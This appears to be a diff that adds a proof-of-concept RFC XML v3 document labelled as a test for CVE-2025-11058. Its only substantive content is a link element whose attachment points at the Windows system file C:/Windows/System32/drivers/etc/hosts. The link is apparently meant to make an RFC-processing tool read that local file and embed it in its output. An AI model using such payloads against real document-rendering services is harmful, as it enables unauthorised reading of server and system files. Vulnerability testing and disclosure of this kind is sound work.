@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rfc version="3" ipr="trust200902" docName="draft-simple-test-00" category="info">
+  <link rel="attachment" href="C:/Windows/System32/drivers/etc/hosts"/>
+  <front>
+    <title>Simple POC Test</title>
+    <author fullname="Test" initials="T." surname="Test">
+      <organization>Test</organization>
+    </author>
+    <date year="2025"/>
+    <abstract>
+      <t>Simple test for CVE-2025-11058.</t>
+    </abstract>
+  </front>
+  <middle>
+    <section anchor="test">
+      <name>Test</name>
+      <t>This is a simple test document.</t>
+    </section>
+  </middle>
+  <back/>
+</rfc>
